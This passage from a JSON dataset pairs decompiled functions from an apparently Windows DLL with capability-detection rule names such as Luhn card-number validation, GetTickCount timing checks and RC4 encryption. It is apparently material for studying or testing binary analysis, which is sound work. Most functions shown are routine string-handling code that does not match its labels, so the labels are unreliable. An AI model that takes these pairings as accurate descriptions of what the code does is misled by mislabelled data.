            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18000a590(ulong arg1, int64_t arg2, ulong *arg3)\n\n{\n    uint *arg2_00;\n    code *pcVar1;\n    int64_t iVar2;\n    ulong in_R9;\n    uchar auStack136 [32];\n    uint auStack104 [2];\n    ulong uStack96;\n    uchar auStack88 [16];\n    int64_t iStack72;\n    int64_t aiStack64 [3];\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack96 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack136;\n    auStack88 = ZEXT816(0);\n    iStack72 = 0;\n    arg3[1] = *arg3;\n    if (*(arg2 + 0x10) == 0) {\n        auStack88._0_8_ = 0;\n    }\n    else {\n        fcn.18000a0f0(arg1, arg2, auStack88, in_R9);\n        if (auStack88._0_8_ != auStack88._8_8_) {\n            do {\n                fcn.18000de50(aiStack64, auStack88._0_8_);\n                auStack104[0] = fcn.1800679c0(aiStack64, 10);\n                arg2_00 = arg3[1];\n                if (arg2_00 == arg3[2]) {\n                    fcn.180012ed0(arg3, arg2_00, auStack104);\n                }\n                else {\n                    *arg2_00 = auStack104[0];\n                    arg3[1] = arg3[1] + 4;\n                }\n                if (0xf < uStack40) {\n                    iVar2 = aiStack64[0];\n                    if (0xfff < uStack40 + 1) {\n                        iVar2 = *(aiStack64[0] + -8);\n                        if (0x1f < (aiStack64[0] - iVar2) - 8U) {\n                            fcn.1800b3528(iVar2, uStack40 + 0x28);\n                            goto code_r0x00018000a702;\n                        }\n                    }\n                    fcn.18008fb24(iVar2);\n                }\n                auStack88._0_8_ = auStack88._0_8_ + 0x20;\n            } while (auStack88._0_8_ != auStack88._8_8_);\n        }\n    }\n    if (auStack88._0_8_ != 0) {\n        fcn.180013b30(auStack88._0_8_, auStack88._8_8_);\n        iVar2 = auStack88._0_8_;\n        if ((0xfff < (iStack72 - auStack88._0_8_ & 0xffffffffffffffe0U)) &&\n           (iVar2 = *(auStack88._0_8_ + -8),  0x1f < (auStack88._0_8_ - iVar2) - 8U)) {\ncode_r0x00018000a702:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(iVar2);\n    }\n    fcn.18008fb00(uStack32 ^ auStack136);\n    return;\n}\n",
        "token_count": 769
    },
    "18000aa6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18000aa60(ulong noname_0, ulong *arg2, int64_t **arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int64_t *arg1;\n    int64_t **ppiVar4;\n    \n    ppiVar4 = arg3;\n    if (0xf < arg3[3]) {\n        ppiVar4 = *arg3;\n    }\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    (**0x1800de490)(arg2, 0, 0, ppiVar4);\n    piVar1 = arg3[3];\n    if (0xf < piVar1) {\n        piVar2 = *arg3;\n        arg1 = piVar2;\n        if (0xfff < piVar1 + 1U) {\n            arg1 = piVar2[-1];\n            if (0x1f < (piVar2 - arg1) - 8U) {\n                fcn.1800b3528(piVar2 - arg1, piVar1 + 5);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1);\n    }\n    arg3[2] = NULL;\n    arg3[3] = 0xf;\n    *arg3 = 0;\n    return;\n}\n",
        "token_count": 326
    },
    "18000af2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18000af20(ulong noname_0, uint64_t arg2)\n\n{\n    code *pcVar1;\n    ushort *puVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint uVar6;\n    int64_t arg3;\n    char in_R8B;\n    int64_t arg3_00;\n    char in_R9B;\n    uchar extraout_XMM0 [16];\n    ulong var_12h;\n    ulong in_stack_00000028;\n    ulong var_220h;\n    uchar auStack856 [32];\n    int64_t aiStack824 [2];\n    uchar auStack808 [16];\n    uchar auStack792 [16];\n    uchar auStack776 [16];\n    uchar auStack760 [16];\n    uchar auStack744 [16];\n    uchar auStack728 [16];\n    uchar auStack712 [16];\n    uchar auStack696 [16];\n    uchar auStack680 [16];\n    ulong uStack664;\n    ushort uStack648;\n    ushort uStack646;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint32_t uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    ushort uStack584;\n    uchar auStack582 [446];\n    ulong var_80h;\n    ulong var_78h;\n    ulong var_70h;\n    ulong var_bp_68h;\n    ulong var_bp_60h;\n    ulong var_bp_50h;\n    ulong var_40h;\n    uint64_t var_bp_30h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h_2;\n    \n    var_bp_30h = *0x180123080 ^ auStack856;\n    fcn.1800ae290(auStack582, 0, 0x206);\n    auStack696 = extraout_XMM0 & 0x0;\n    uStack664 = 0;\n    uStack584 = 0;\n    auStack808 = ZEXT816(arg2) << 0x40;\n    arg3 = -1;\n    auStack808 = CONCAT124(auStack808._4_12_, 0x98);\n    auStack792 = ZEXT816(0x1800f47f8) << 0x40;\n    auStack712 = ZEXT816(0x1800f4830) << 0x40;\n    auStack728._8_8_ = L\"Save Backup Configuration File\";\n    if (in_R8B != '\\0') {\n        auStack728._8_8_ = L\"Open Backup Configuration File\";\n    }\n    auStack728._0_8_ = 0;\n    uVar6 = 2;\n    auStack776 = CONCAT412(2, SUB1612(auStack696, 0));\n    if (in_R8B != '\\0') {\n        uVar6 = 0x1800;\n    }\n    auStack712 = CONCAT124(auStack712._4_12_, uVar6);\n    auStack744._0_12_ = ZEXT812(0);\n    auStack744 = CONCAT412(SUB164(extraout_XMM0 >> 0x60, 0), auStack744._0_12_) & 0xffffffffffffffff;\n    auStack680 = auStack696;\n    if (in_R9B == '\\0') {\n        iVar4 = (**0x1800de550)(0x1800dea60, 0, 0, aiStack824);\n        if (iVar4 == 0) {\n            uStack600 = *0x180101900;\n            uStack596 = *0x180101904;\n            uStack592 = *0x180101908;\n            uStack588 = *0x18010190c;\n            uStack616 = uStack616 & 0xffff0000;\n            arg3_00 = arg3;\n            do {\n                arg3_00 = arg3_00 + 1;\n            } while (*(aiStack824[0] + arg3_00 * 2) != 0);\n            fcn.180010d70(&uStack616, aiStack824[0], arg3_00);\n            (**0x1800de8d8)(aiStack824[0]);\n            uStack648 = uStack616;\n            uStack646 = uStack616 >> 0x10;\n            uStack644 = uStack612;\n            uStack640 = uStack608;\n            uStack636 = uStack604;\n            uStack632 = uStack600;\n            uStack628 = uStack596;\n            uStack624 = uStack592;\n            uStack620 = uStack588;\n        }\n        else {\n            uStack648 = 0;\n            uStack632 = *0x180101900;\n            uStack628 = *0x180101904;\n            uStack624 = *0x180101908;\n            uStack620 = *0x18010190c;\n            fcn.180010d70(&uStack648, 0x1800fa194, 0);\n        }\n        uVar3 = CONCAT44(uStack620, uStack624);\n        puVar2 = CONCAT44(uStack644, CONCAT22(uStack646, uStack648));\n        puVar5 = &uStack648;\n        if (7 < uVar3) {\n            puVar5 = puVar2;\n        }\n        auStack728 = CONCAT88(auStack728._8_8_, puVar5);\n        if (7 < uVar3) {\n            puVar5 = puVar2;\n            if (0xfff < uVar3 * 2 + 2) {\n                puVar5 = *(puVar2 + -4);\n                if (0x1f < puVar2 + (-8 - puVar5)) {\n                    fcn.1800b3528(puVar5, uVar3 * 2 + 0x29);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(puVar5);\n        }\n    }\n    else {\n        auStack728 = CONCAT88(auStack728._8_8_, 0x180124b18);\n    }\n    if (in_R8B == '\\0') {\n        iVar4 = (**0x1800de038)(auStack808);\n    }\n    else {\n        iVar4 = (**0x1800de030)();\n    }\n    if (iVar4 != 0) {\n        do {\n            arg3 = arg3 + 1;\n        } while (*(auStack760._0_8_ + arg3 * 2) != 0);\n        fcn.180010d70(in_stack_00000028, auStack760._0_8_, arg3);\n    }\n    fcn.18008fb00(var_bp_30h ^ auStack856);\n    return;\n}\n",
        "token_count": 1640
    },
    "18000bcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.18000bcf0(void)\n\n{\n    char cVar1;\n    char cVar2;\n    char cVar3;\n    ulong uVar4;\n    uchar *puVar5;\n    uchar auStack40 [32];\n    \n    puVar5 = auStack40;\n    uVar4 = fcn.18000da90(puVar5, 0x1801253f8);\n    cVar1 = fcn.18000c270(puVar5, uVar4);\n    puVar5 = auStack40;\n    uVar4 = fcn.18000da90(puVar5, 0x180125418);\n    cVar2 = fcn.18000c270(puVar5, uVar4);\n    puVar5 = auStack40;\n    uVar4 = fcn.18000da90(puVar5, 0x180125498);\n    cVar3 = fcn.18000c270(puVar5, uVar4);\n    return cVar3 != '\\0' && (cVar2 != '\\0' && cVar1 != '\\0');\n}\n",
        "token_count": 244
    },
    "18000d39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18000d390(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    \n    if (*arg1 != 0) {\n        fcn.180013b30(*arg1, arg1[1]);\n        iVar1 = *arg1;\n        uVar3 = arg1[2] - iVar1 & 0xffffffffffffffe0;\n        arg1_00 = iVar1;\n        if (0xfff < uVar3) {\n            arg1_00 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar1 - arg1_00, uVar3 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n        *arg1 = 0;\n        arg1[1] = 0;\n        arg1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "18000d96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.18000d960(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    int64_t arg1_00;\n    \n    if (arg1 != arg2) {\n        if (7 < arg1[3]) {\n            iVar2 = *arg1;\n            iVar1 = arg1[3] * 2;\n            arg1_00 = iVar2;\n            if (0xfff < iVar1 + 2U) {\n                arg1_00 = *(iVar2 + -8);\n                if (0x1f < (iVar2 - arg1_00) - 8U) {\n                    fcn.1800b3528(iVar2 - arg1_00, iVar1 + 0x29);\n                    pcVar3 = swi(3);\n                    piVar7 = (*pcVar3)();\n                    return piVar7;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        arg1[3] = 7;\n        arg1[2] = 0;\n        *arg1 = 0;\n        uVar4 = *(arg2 + 4);\n        uVar5 = *(arg2 + 1);\n        uVar6 = *(arg2 + 0xc);\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar4;\n        *(arg1 + 1) = uVar5;\n        *(arg1 + 0xc) = uVar6;\n        uVar4 = *(arg2 + 0x14);\n        uVar5 = *(arg2 + 3);\n        uVar6 = *(arg2 + 0x1c);\n        *(arg1 + 2) = *(arg2 + 2);\n        *(arg1 + 0x14) = uVar4;\n        *(arg1 + 3) = uVar5;\n        *(arg1 + 0x1c) = uVar6;\n        arg2[2] = 0;\n        arg2[3] = 7;\n        *arg2 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 508
    },
    "18000da3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * fcn.18000da30(ushort *arg1, int64_t arg2)\n\n{\n    int64_t arg3;\n    \n    *(arg1 + 0xc) = 7;\n    *(arg1 + 8) = 0;\n    *arg1 = 0;\n    arg3 = -1;\n    do {\n        arg3 = arg3 + 1;\n    } while (*(arg2 + arg3 * 2) != 0);\n    fcn.180010d70(arg1, arg2, arg3);\n    return arg1;\n}\n",
        "token_count": 124
    },
    "18000da9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000da90(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong arg1_00;\n    uint64_t uVar5;\n    \n    arg1[2] = 0;\n    arg1[3] = 0;\n    uVar1 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    if (uVar1 < 8) {\n        uVar2 = *(arg2 + 4);\n        uVar3 = *(arg2 + 1);\n        uVar4 = *(arg2 + 0xc);\n        uVar5 = 7;\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar2;\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xc) = uVar4;\n    }\n    else {\n        uVar5 = uVar1 | 7;\n        if (0x7ffffffffffffffe < uVar5) {\n            uVar5 = 0x7ffffffffffffffe;\n        }\n        arg1_00 = fcn.180011cf0(arg1, uVar5 + 1);\n        *arg1 = arg1_00;\n        fcn.1800ade80(arg1_00, arg2, uVar1 * 2 + 2);\n    }\n    arg1[2] = uVar1;\n    arg1[3] = uVar5;\n    return arg1;\n}\n",
        "token_count": 356
    },
    "18000db2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.18000db20(ulong *arg1, char **arg2, uint64_t arg3)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    char *arg3_00;\n    int32_t iVar3;\n    int64_t arg1_00;\n    uint64_t uVar4;\n    \n    arg3_00 = arg2[2];\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    ppcVar1 = arg1 + 2;\n    if (0xf < arg1[3]) {\n        arg1 = *arg1;\n    }\n    if ((arg3_00 <= *ppcVar1) && (uVar4 = *ppcVar1 - arg3_00,  arg3 <= uVar4)) {\n        if (arg3_00 == NULL) {\n            return arg3;\n        }\n        cVar2 = *arg2;\n        arg1_00 = fcn.1800ae430(arg1 + arg3, cVar2, arg1 + ((uVar4 + 1) - (arg1 + arg3)));\n        while( true ) {\n            if (arg1_00 == 0) {\n                return 0xffffffffffffffff;\n            }\n            iVar3 = fcn.1800ae4d0(arg1_00, arg2, arg3_00);\n            if (iVar3 == 0) break;\n            arg1_00 = fcn.1800ae430(arg1_00 + 1, cVar2, arg1 + ((uVar4 + 1) - (arg1_00 + 1)));\n        }\n        return arg1_00 - arg1;\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 384
    },
    "18000dcd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.18000dcd0(ulong *arg1, ulong *arg2)\n\n{\n    ulong *puVar1;\n    \n    if (arg1 != arg2) {\n        puVar1 = arg2 + 2;\n        if (0xf < arg2[3]) {\n            arg2 = *arg2;\n        }\n        fcn.180011120(arg1, arg2, *puVar1);\n    }\n    return arg1;\n}\n",
        "token_count": 100
    },
    "18000dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18000dd00(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    int64_t arg1_00;\n    \n    uVar1 = arg1[3];\n    if (0xf < uVar1) {\n        iVar2 = *arg1;\n        arg1_00 = iVar2;\n        if (0xfff < uVar1 + 1) {\n            arg1_00 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(iVar2 - arg1_00, uVar1 + 0x28);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[2] = 0;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 235
    },
    "18000dd6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.18000dd60(int64_t *arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int64_t *piVar7;\n    int64_t arg1_00;\n    \n    if (arg1 != arg2) {\n        uVar1 = arg1[3];\n        if (0xf < uVar1) {\n            iVar2 = *arg1;\n            arg1_00 = iVar2;\n            if (0xfff < uVar1 + 1) {\n                arg1_00 = *(iVar2 + -8);\n                if (0x1f < (iVar2 - arg1_00) - 8U) {\n                    fcn.1800b3528(iVar2 - arg1_00, uVar1 + 0x28);\n                    pcVar3 = swi(3);\n                    piVar7 = (*pcVar3)();\n                    return piVar7;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        arg1[3] = 0xf;\n        arg1[2] = 0;\n        *arg1 = 0;\n        uVar4 = *(arg2 + 4);\n        uVar5 = *(arg2 + 1);\n        uVar6 = *(arg2 + 0xc);\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar4;\n        *(arg1 + 1) = uVar5;\n        *(arg1 + 0xc) = uVar6;\n        uVar4 = *(arg2 + 0x14);\n        uVar5 = *(arg2 + 3);\n        uVar6 = *(arg2 + 0x1c);\n        *(arg1 + 2) = *(arg2 + 2);\n        *(arg1 + 0x14) = uVar4;\n        *(arg1 + 3) = uVar5;\n        *(arg1 + 0x1c) = uVar6;\n        arg2[2] = 0;\n        arg2[3] = 0xf;\n        *arg2 = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 509
    },
    "18000de5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t * fcn.18000de50(uint64_t *arg1, ulong *arg2)\n\n{\n    uint64_t arg1_00;\n    uint64_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    \n    uVar8 = 0;\n    arg1[2] = 0;\n    arg1[3] = 0;\n    uVar1 = arg2[2];\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    if (uVar1 < 0x10) {\n        uVar3 = *(arg2 + 4);\n        uVar4 = *(arg2 + 1);\n        uVar5 = *(arg2 + 0xc);\n        uVar9 = 0xf;\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n    }\n    else {\n        uVar9 = uVar1 | 0xf;\n        if (0x7fffffffffffffff < uVar9) {\n            uVar9 = 0x7fffffffffffffff;\n        }\n        arg1_00 = uVar9 + 1;\n        if (arg1_00 < 0x1000) {\n            if (arg1_00 != 0) {\n                uVar8 = fcn.18008fb2c(arg1_00);\n            }\n        }\n        else {\n            uVar8 = uVar9 + 0x28;\n            if (uVar8 <= arg1_00) {\n                uVar8 = 0xffffffffffffffff;\n            }\n            iVar6 = fcn.18008fb2c(uVar8);\n            if (iVar6 == 0) {\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                puVar7 = (*pcVar2)();\n                return puVar7;\n            }\n            uVar8 = iVar6 + 0x27U & 0xffffffffffffffe0;\n            *(uVar8 - 8) = iVar6;\n        }\n        *arg1 = uVar8;\n        fcn.1800ade80(uVar8, arg2, uVar1 + 1);\n    }\n    arg1[2] = uVar1;\n    arg1[3] = uVar9;\n    return arg1;\n}\n",
        "token_count": 579
    },
    "18001179": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011790(int64_t arg1, int64_t *arg2)\n\n{\n    char cVar1;\n    \n    cVar1 = (**(*arg2 + 0x18))(arg2);\n    if (cVar1 != '\\0') {\n        *(arg1 + 0x68) = 0;\n        return;\n    }\n    *(arg1 + 0x68) = arg2;\n    *(arg1 + 0x18) = arg1 + 8;\n    *(arg1 + 0x20) = arg1 + 0x10;\n    *(arg1 + 0x38) = arg1 + 0x28;\n    *(arg1 + 0x40) = arg1 + 0x30;\n    *(arg1 + 0x50) = arg1 + 0x48;\n    *(arg1 + 0x58) = arg1 + 0x4c;\n    *(arg1 + 0x10) = 0;\n    **(arg1 + 0x40) = 0;\n    **(arg1 + 0x58) = 0;\n    **(arg1 + 0x18) = 0;\n    **(arg1 + 0x38) = 0;\n    **(arg1 + 0x50) = 0;\n    return;\n}\n",
        "token_count": 297
    },
    "1800c34d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800c34d4(int64_t arg1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    ulong arg1_00;\n    \n    if ((arg1 != 0) && (arg1_00 = *0x180129fa0,  iVar2 = (**0x1800de208)(*0x180129fa0, 0, arg1),  iVar2 == 0)) {\n        puVar1 = fcn.1800ba53c(arg1_00);\n        uVar3 = (**0x1800de400)();\n        uVar4 = fcn.1800ba484(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "18000efc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar (*) [16] fcn.18000efc0(int64_t arg1, uchar (*arg2) [16], int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    ulong in_R9;\n    uint uVar5;\n    ulong uVar6;\n    uchar (*pauVar7) [16];\n    \n    uVar6 = 0xfffffffffffffffe;\n    *arg2 = ZEXT816(0);\n    piVar1 = *(*(arg1 + 0x40) + 8);\n    *(*arg2 + 8) = piVar1;\n    pauVar7 = arg2;\n    (**(*piVar1 + 8))();\n    uVar5 = 2;\n    iVar2 = *(arg1 + 0x40);\n    piVar1 = *(iVar2 + 8);\n    if (piVar1 != *(arg3 + 8)) {\n        puVar4 = (**(*piVar1 + 0x10))();\n        if (puVar4 != NULL) {\n            (***puVar4)(puVar4, 1);\n        }\n        piVar1 = *(arg3 + 8);\n        *(iVar2 + 8) = piVar1;\n        (**(*piVar1 + 8))();\n    }\n    for (puVar4 = *(arg1 + 0x38); puVar4 != NULL; puVar4 = *puVar4) {\n        (*puVar4[2])(1, arg1, *(puVar4 + 1), in_R9, uVar5, uVar6, pauVar7);\n    }\n    piVar1 = *(arg1 + 0x48);\n    if (piVar1 != NULL) {\n        piVar3 = *(piVar1[0xc] + 8);\n        (**(*piVar3 + 8))(piVar3);\n        uVar5 = 5;\n        (**(*piVar1 + 0x70))(piVar1, arg3);\n        iVar2 = piVar1[0xc];\n        piVar1 = *(iVar2 + 8);\n        if (piVar1 != *(arg3 + 8)) {\n            puVar4 = (**(*piVar1 + 0x10))();\n            if (puVar4 != NULL) {\n                (***puVar4)(puVar4, 1);\n            }\n            piVar1 = *(arg3 + 8);\n            *(iVar2 + 8) = piVar1;\n            (**(*piVar1 + 8))();\n        }\n        if ((piVar3 != NULL) && (puVar4 = (**(*piVar3 + 0x10))(piVar3),  puVar4 != NULL)) {\n            (***puVar4)(puVar4, 1, *puVar4, in_R9, uVar5);\n        }\n    }\n    return arg2;\n}\n",
        "token_count": 646
    },
    "180010f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180010f10(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    ulong arg1_00;\n    uint64_t uVar5;\n    \n    uVar1 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    if (uVar1 < 8) {\n        uVar2 = *(arg2 + 4);\n        uVar3 = *(arg2 + 1);\n        uVar4 = *(arg2 + 0xc);\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar2;\n        *(arg1 + 1) = uVar3;\n        *(arg1 + 0xc) = uVar4;\n        arg1[2] = uVar1;\n        arg1[3] = 7;\n        return;\n    }\n    uVar5 = uVar1 | 7;\n    if (0x7ffffffffffffffe < uVar5) {\n        uVar5 = 0x7ffffffffffffffe;\n    }\n    arg1_00 = fcn.180011cf0(arg1, uVar5 + 1);\n    *arg1 = arg1_00;\n    fcn.1800ade80(arg1_00, arg2, uVar1 * 2 + 2);\n    arg1[2] = uVar1;\n    arg1[3] = uVar5;\n    return;\n}\n",
        "token_count": 344
    },
    "18001131": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180011310(uint64_t *arg1, ulong *arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    uint64_t arg1_00;\n    uint64_t arg1_01;\n    uint64_t uVar7;\n    \n    uVar1 = arg2[2];\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    if (uVar1 < 0x10) {\n        uVar3 = *(arg2 + 4);\n        uVar4 = *(arg2 + 1);\n        uVar5 = *(arg2 + 0xc);\n        *arg1 = *arg2;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        arg1[2] = uVar1;\n        arg1[3] = 0xf;\n        return;\n    }\n    uVar7 = uVar1 | 0xf;\n    if (0x7fffffffffffffff < uVar7) {\n        uVar7 = 0x7fffffffffffffff;\n    }\n    arg1_00 = uVar7 + 1;\n    if (arg1_00 < 0x1000) {\n        if (arg1_00 != 0) {\n            arg1_00 = fcn.18008fb2c(arg1_00);\n        }\n    }\n    else {\n        arg1_01 = uVar7 + 0x28;\n        if (arg1_01 <= arg1_00) {\n            arg1_01 = 0xffffffffffffffff;\n        }\n        iVar6 = fcn.18008fb2c(arg1_01);\n        if (iVar6 == 0) {\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        arg1_00 = iVar6 + 0x27U & 0xffffffffffffffe0;\n        *(arg1_00 - 8) = iVar6;\n    }\n    *arg1 = arg1_00;\n    fcn.1800ade80(arg1_00, arg2, uVar1 + 1);\n    arg1[3] = uVar7;\n    arg1[2] = uVar1;\n    return;\n}\n",
        "token_count": 550
    },
    "1800113e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
